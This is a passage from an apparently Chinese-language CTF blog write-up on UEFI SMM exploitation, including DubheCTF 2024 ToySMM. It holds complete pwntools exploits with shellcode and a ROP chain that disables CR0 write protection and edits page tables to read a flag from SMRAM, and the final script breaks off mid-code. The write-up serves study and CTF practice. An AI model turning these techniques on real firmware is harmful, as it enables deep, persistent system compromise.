class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy real ROP chain into buffer + 0x800 */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + real_chain]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;real_chain_size&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* These two regs will spill on SMI stack */</span></span><br><span class="line"><span class="string">    mov r14, 0x7fe5269         /* pop rsp; ret */</span></span><br><span class="line"><span class="string">    mov r15, <span class="subst">&#123;buffer + <span class="number">0x800</span>&#125;</span>  /* -&gt; RSP */</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">real_chain:</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;real_chain&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX  - &#x27;</span>)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最终效果如下：  </p><img src="/2024/12/14/uefi/23.png" class="" title="我的图图呢">  <h3 id="DubheCTF-2024-ToySMM"><a href="#DubheCTF-2024-ToySMM" class="headerlink" title="DubheCTF 2024 ToySMM"></a>DubheCTF 2024 ToySMM</h3><p>恭喜你已经成功入门 UEFI，接下来就来看看 XCTF 吧🤣🤣🤣</p><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p><blockquote><p>UEFI SMM<br>U know?<br>:)  </p></blockquote><p>运行效果：  </p><img src="/2024/12/14/uefi/24.png" class="" title="我的图图呢">  <p>题目的文件结构如下：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ToySMM/</span><br><span class="line">├── OVMF_CODE.fd</span><br><span class="line">├── OVMF_VARS.fd</span><br><span class="line">├── flagregion</span><br><span class="line">├── kvmvapic.bin</span><br><span class="line">├── qemu-system-x86_64</span><br><span class="line">├── readme.md</span><br><span class="line">├── rootfs</span><br><span class="line">│   ├── ToyApp.efi</span><br><span class="line">│   └── startup.nsh</span><br><span class="line">└── run.sh</span><br></pre></td></tr></table></figure><p>有一个 readme.md 文件，内容如下：  </p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## Quick start</span></span><br><span class="line"></span><br><span class="line"><span class="code">`./run.sh`</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Files</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> flagregion</span><br><span class="line"></span><br><span class="line">​       Real flag (Not very real :)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> kvmvapic.bin</span><br><span class="line"></span><br><span class="line">​       Used by qemu-system-x86<span class="emphasis">_64</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ qemu-system-x86_</span>64</span><br><span class="line"></span><br><span class="line">​       Self build qemu with some patch to smm region (Hide real flag in 0x23330000)</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> run.sh</span><br><span class="line"></span><br><span class="line">​       Start the virtual UEFI OVMF env.</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> OVMF<span class="emphasis">_CODE.fd OVMF_</span>VARS.fd</span><br><span class="line"></span><br><span class="line">​       UEFI emulation env build with edk2</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> rootfs</span><br><span class="line"></span><br><span class="line">​       Store a nsh file to auth start ToyApp.efi</span><br><span class="line"></span><br><span class="line"><span class="section">## Notice &amp;&amp; Tips</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Seld-build qemu-systyem-x86<span class="emphasis">_64 is built and tested on ubuntu</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ [<span class="string">UEFITools</span>](<span class="link">https://github.com/LongSoft/UEFITool</span>)  is a tool parse UEFI Firmware package</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">+ Only Ring -2 privileges can read the correct flag in 0x23330000</span></span><br></pre></td></tr></table></figure><p>也就是说我们需要利用漏洞来获取地址 0x23330000 上的 flag，感觉要求和上面两道题基本一致。<br>由于这道题没有给出 patch 文件且只给了打包好的固件，所以这个时候我们需要使用一个 ida 插件 <a href="https://github.com/binarly-io/efiXplorer/releases">efiXplorer</a> 来帮我们解包。安装好该插件后将 OVMF_CODE.fd 拖进 ida 后会自动进行解包。通过直觉🤣🤣🤣找到了 ToySMM_handler 函数然后手动恢复了一下符号：  </p><img src="/2024/12/14/uefi/25.png" class="" title="我的图图呢">  <p>该函数第一个 if 语句里面是调用一次 BOOT_SERVICES-&gt;LocateProtocol，第二个 if 语句是不可能进去的，这让我很好奇 sub_363000 这个函数是在干什么 :)  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_363000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_364052</span>(<span class="number">0x23330000</span>i64, <span class="number">32</span>i64);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_364052</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  __int64 i; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; a2 != i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v4 = __inbyte(<span class="number">0x3FD</span>u);</span><br><span class="line">    <span class="keyword">while</span> ( (v4 &amp; <span class="number">0x20</span>) == <span class="number">0</span> );</span><br><span class="line">    __outbyte(<span class="number">0x3F8</span>u, *(_BYTE *)(a1 + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数就类似于用于打印 flag 的后门函数，所以我们让程序执行这个函数即可。然后这里让我没想到的是，BOOT_SERVICES 这个函数虚表是可以改的，所以我们直接把 BOOT_SERVICES-&gt;LocateProtocol 改成打印后门的函数就能直接获取 flag 了，不过在这之前要满足第一个 if 的条件。不过由于 CommBuffer 和 CommBufferSize 是我们这些用户可控的，所以很容易满足。这里还有一个问题就是如何找到后门函数的地址，我的做法是直接在 gdb 中搜索 0x23330000，因为在调用后门函数前的第二个 if 语句有对这个数的使用  </p><img src="/2024/12/14/uefi/26.png" class="" title="我的图图呢">  <p>然后直接和 ida 里的汇编进行比较，就能够找到后门函数的地址  </p><img src="/2024/12/14/uefi/27.png" class="" title="我的图图呢">  <h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices&#125;</span></span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr 